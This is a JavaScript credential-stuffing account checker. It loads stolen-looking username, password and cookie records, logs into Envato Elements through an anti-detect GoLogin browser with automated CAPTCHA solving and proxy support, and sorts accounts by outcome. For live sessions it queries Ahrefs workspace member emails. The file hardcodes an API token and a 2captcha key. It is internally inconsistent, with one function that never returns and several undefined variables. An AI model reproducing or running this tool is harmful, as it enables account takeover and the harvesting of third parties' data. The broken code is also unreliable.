import fs from 'fs/promises';
import GoLogin from './src/gologin.js'
import puppeteerr from 'puppeteer-extra';
import RecaptchaPlugin from 'puppeteer-extra-plugin-recaptcha';
import https from 'https';
import 'dotenv/config';







const delay = (time) => new Promise((resolve) => setTimeout(resolve, time));

let raw_token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI2NmNiOTUyMDcwODJkMmYwOWNjNzc2NTEiLCJ0eXBlIjoiZGV2Iiwiand0aWQiOiI2NmNiOTUzMDdjY2MzODc5MTFmNmFmNWMifQ.Pk0CJ7Ca4KsTKCfXPZ0SOCZ14ZRc1fAwbzV9RpyhWs0';




puppeteerr.use(
  RecaptchaPlugin({
    provider: {
      id: '2captcha',
      token: '62c9b1a027ee362843a8c7072ae3af2a' // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
    },
    visualFeedback: true // colorize reCAPTCHAs (violet = detected, green = solved)
  })
)

const account_creater = async (username, password, cookiess) =>
 {

  return new Promise (async(resolve, reject) => 
  {
    
    try {


        const GLL = new GoLogin({ token: raw_token });

        const profile_id = await GLL.create({
            name: 'ahref',
             os: 'win',
             navigator: {
               language: 'en-US,en;q=0.9',
               userAgent: 'random', 
               resolution: '1024x768',
             },
             proxyEnabled: false,
             proxy: {
                 mode: process.env.PROXY_TYPE,
                 host: process.env.PROXY_HOST,
                 port: process.env.PROXY_PORT,
                 username: process.env.PROXY_USER,
                 password: process.env.PROXY_PASS
             },
           });
        
           console.log(profile_id)
           const GL = new GoLogin({
            token: raw_token,
            profile_id: profile_id,
            extra_params: [
              '--disable-features=IsolateOrigins,site-per-process,SitePerProcess',
              '--flag-switches-begin --disable-site-isolation-trials --flag-switches-end',
              '--disable-extensions'
            ]
          });
        
          const { status, wsUrl } = await GL.start().catch((e) => {
            console.trace(e);
            return { status: 'failure' };
          });
        
          if (status !== 'success') {
            console.log('Invalid status');
            return;
          }
        
          const browser = await puppeteerr.connect({
            browserWSEndpoint: wsUrl.toString(),
            ignoreHTTPSErrors: true,
            args: [
              '--disable-features=IsolateOrigins,site-per-process,SitePerProcess',
              '--flag-switches-begin --disable-site-isolation-trials --flag-switches-end'
            ]
          });
        


        const page = await browser.newPage();

        const viewPort = GL.getViewPort();
        await page.setViewport({ width: Math.round(viewPort.width * 0.994), height: Math.round(viewPort.height * 0.92) });
        const session = await page.target().createCDPSession();
        const { windowId } = await session.send('Browser.getWindowForTarget');
        await session.send('Browser.setWindowBounds', { windowId, bounds: viewPort });
        await session.detach();
          
        page.setDefaultNavigationTimeout(60000);
        page.setDefaultTimeout(60000);
    
      
        try
        {
            const client = await page.target().createCDPSession();
            await client.send('Network.clearBrowserCookies');
            await client.send('Network.clearBrowserCache');

            console.log(cookiess)

          await page.goto('https://elements.envato.com/sign-in');
          await page.setCookie(...cookiess);
          await page.reload()
          ////await addDataInMsgQueue(" Ahrefs Page Opened")
          console.log(" Page Opened..")
          let tries = 0
          let repeat_tries = 0
          while(true)
          {
             await delay(5000)
             let body = await page.content();
           //  console.log(body);
             
             if(body)
             {
              tries++;
              

              //login error
              if(body.includes("not your correct details"))
              {
                try
                {
                  tries--
                  console.log(" Incorrect email or password")
                  await browser.close();
                  return resolve(["incorrectDetails", '', '']);

             
        
                }
                catch(e)
                {
                  
                 // console.log(" Account Login Successful")
        
                }
              }
              if(body.includes("Your account is connected to Google"))
              {
                try
                {
                  tries--
                  console.log(" Account connected to Google, Found")
                  await browser.close();
                  return resolve(["anErrorOuccurred", '', '']);

             
        
                }
                catch(e)
                {
                  
                 // console.log(" Account Login Successful")
        
                }
              }

              // normal functions
              if(body.includes("Sign in") && body.includes("Create an Envato account"))
              {
                try
                {
                  tries--
                  repeat_tries++
                  await page.waitForSelector('input[id="username"]' , { timeout: 10000 });
                  await page.click('input[id="username"]');
                  await page.type('input[id="username"]', username);
                  console.log(" Email Entered..")
                  //await addDataInMsgQueue(" Email Entered")
        
                  await page.waitForSelector('input[id="password"]');
                  await page.click('input[id="password"]');
                  await page.type('input[id="password"]', password);
                  console.log(" Password Entered..")
                  //await addDataInMsgQueue(" Password Entered")
        
                  await delay(3000)
                  await page.waitForSelector('button[id="sso-forms__submit"]')
                  await page.click('button[id="sso-forms__submit"]');
                  console.log(" Login Clicked..")

                  while(1)
                  {
                    try
                    {
                        await page.waitForSelector('button[disabled=""]' , { timeout: 2000 });
                        await delay(2000)
                    }
                    catch(e)
                    {
                        break;
                    }
                  }
                 
                  //await addDataInMsgQueue(" Login Clicked")
                  if(repeat_tries > 3)
                  {
                    //await addDataInMsgQueue(" Repeat Tries Found")
                    //await addDataInMsgQueue(" Bot Stopped")
                //    await updateError(email ,'repeatTries' )
                    await browser.close();
                    return resolve(["repeatTries", '', '']);
                  }

                  continue;
        
                }
                catch(e)
                {
                  
                 // console.log(" Account Login Successful")
        
                }
              }
              if(body.includes("Confirm your sign-in") || body.includes("sent an email to confirm"))
              {
                try
                {
                  tries--
              //    await page.waitForSelector('#verification-required' , { timeout: 10000 });
                  console.log(" Verification Found... ")
                    await browser.close();
                    return resolve(["otpfail", '', '']);
                }
                catch(e)
                {
                  //await addDataInMsgQueue(" Verification not Required")
                  console.log(" Verification not Required.." + e )
        
                }
              }
              if(body.includes("Welcome") && body.includes("All categories"))
              {
                try
                {
                  tries--

             //     await page.waitForSelector('a[href="/dashboard"]' , { timeout: 10000 });
                  console.log(" Account Login Successful")
                  const userAgent = await page.evaluate(() => navigator.userAgent);
                //  await updateError(email ,'noError' )
                  //await addDataInMsgQueue(" Account Login Successful")
                //  await delay(500000000)
                  const cookies = await page.cookies()

                  while(process.env.FREEZ_EXECUTION == true)
                  {
                    console.log(" in freeezz")
                    await delay(2000)
                  }
                    
                  await browser.close();
                  return resolve(["success", cookies, userAgent]);
        
                }
                catch(e)
                {
                  
                  console.log("error : " + e)
                  //await addDataInMsgQueue(" Account Login Failed")
                  return reject(false);
        
                }
              }
              if(body.includes("Verify you are human") || body.includes("Performance & security by Cloudflare") || body.includes("if the site connection is secure"))
              {
                try
                {
                  tries--
                  await page.waitForSelector('#challenge-running' , { timeout: 10000 });
                  //await addDataInMsgQueue(" Cloudflare found --> Change IP Or User-Agent")
                  console.log(" Cloudflare found --> Changing User-Agent...")
                  await browser.close();
        //
                  return resolve(["cloudflare", '', '']);

        
                }
                catch(e)
                {
               //   //await addDataInMsgQueue(" Verification not Required")
                  console.log(" Cloudflare not found"  )
        
                }
              }

              if(tries > 3)
              {
                await browser.close();
                bot.telegram.sendMessage(`${botChatID}`, `${sitename} - ${toolname}, New Case Found`)
                await updateError(email ,'newCaseFound' )
                return resolve(["newCaseFound", '', '']);

              }

             }
          }
        }
        catch(e)
        {
          console.log(e)
          //await addDataInMsgQueue(e)
          return reject(false);
        }
    
  


  
      }
      catch (e) {
        console.log(e)
        return reject(false);
      }

 });


}
async function getAhrefsPlan(cookies, useragent) {
    return new Promise(async (resolve, reject) => {
      
      try
      {
        console.log("  in getAhrefsPlan ")
      }
      catch(e)
      {
        console.log(" Error in getAhrefsPlan "+ e)
        return reject (null)
      }
    });
}


async function getAhrefsMembers(cookies, useragent) {
  return new Promise(async (resolve, reject) => {
    
    try
    {
      const options = {
        hostname: 'app.ahrefs.com',
        path: '/v4/tkGetWorkspaceInfo',
        method: 'POST',
        headers: {
          'Origin': 'https://app.ahrefs.com',
          'Content-Type': 'application/json',
          'Referer': 'https://app.ahrefs.com/account/members/confirmed',
          'User-Agent':useragent,
          'Cookie' : cookies
          }

      };
  


      
      const req = https.request(options, res => {
        let data = '';
      
        res.on('data', chunk => {
          data += chunk;
        });
      
        res.on('end', () => {
        //   process.stdout.write(data)
        console.log(" Member Plan ", res.statusCode)
          if(res.statusCode == 200)
            {
              
              data = JSON.parse(data)

              let jsondata = [
                    
              ]

              let tmpdata = 
              {
                  email : '',
                  role : ''
              }
              data.confirmedMembers.forEach(member => {
                  tmpdata.email = member.email
                  tmpdata.role = member.role
                  jsondata.push(tmpdata)
              });


              
              return resolve(jsondata)
              
            }
            else
            {
              return reject(false)
            }
          
        });
      });
      
      req.on('error', error => {
        console.error(error);
        return reject (null)
      });
      

      req.write('{"order":"Asc","sortBy":"Name"}');
      req.end();
    }
    catch(e)
    {
      console.log(" Error in getAhrefsPlan "+ e)
      return reject (null)
    }
  });
}
const starter = async  () => 
{

    const Accdata = await fs.readFile('bot_input.json', 'utf8');
    const jsonData = JSON.parse(Accdata);
    const lenOfAccounts = Object.keys(jsonData).length;

    var AccLog = await fs.readFile('bot_log.json', 'utf8');
    var jsonLog = JSON.parse(AccLog);
    console.log(" Total Account Length = " + lenOfAccounts)



    try
    {
        if(lenOfAccounts > 0)
        {
    
            for( let i = jsonLog.accountNo; i < lenOfAccounts; i++)
            {
                let username = jsonData[i].PasswordLog.UserName
                let password = jsonData[i].PasswordLog.Password
                let cookies = jsonData[i].Cookies

                if(username.length == 0 || password.length == 0)
                continue;

                if(!username.includes('@'))
                continue;


    
                cookies.forEach(cookie => {
                    for (const key in cookie) {
                      if (cookie[key] === null) {
                        delete cookie[key];
                      }
                    }
                  });
                  
                console.log(" Checking Acc no = "+ i);
                  
                let [data, loginCookies, useragent] = await account_creater(username, password, cookies);
                console.log(data)
                if(data)
                {
    
                    let logindata = 
                    {
                        "accountNo" : i,
                        "userName" : username,
                        "password" : password
                    }
    
                    if(data == "success")
                    {
    
                        
                        const stringCookies = loginCookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
                        let jsonPlan = await getAhrefsPlan(stringCookies, useragent)
                        console.log( " returnn from ")
                        let memberData = await getAhrefsMembers(stringCookies, useragent)
    
                        jsonPlan.members = memberData
                        logindata.useragent = useragent
                        logindata.cookies = loginCookies
                        logindata.usageAndMember = jsonPlan

                        if(logindata.usageAndMember.planName != 'free')
                        jsonLog["success"].push(logindata)
                        else
                        jsonLog["freePlan"].push(logindata)
    
                     //   await delay(500000000)
    
                    }
                    else if(data == "incorrectDetails")
                    {
                        jsonLog["incorrectData"].push(logindata)
                    }
                    else if(data == "anErrorOuccurred")
                    {
                        jsonLog["block"].push(logindata)
                    }
                    else if(data == "otpfail")
                    {
                        jsonLog["otpRequried"].push(logindata)
                    }
                    else if(data == "cloudflare")
                    {
                        jsonLog["cloudflare"].push(logindata)
                    }
                    else if(data == "newCaseFound")
                    {
                        jsonLog["newCaseFound"].push(logindata)
                    }
                    else 
                    {
                        jsonLog["fail"].push(logindata)
                    }
    
                    jsonLog.accountNo = (i+1)
    
                    await fs.writeFile('bot_log.json', JSON.stringify(jsonLog, null, 2));
                    console.log(" Log updated --->")
                }
            }
        }
    }
    catch(e)
    {
        console.log(e)
    }
    

}

starter()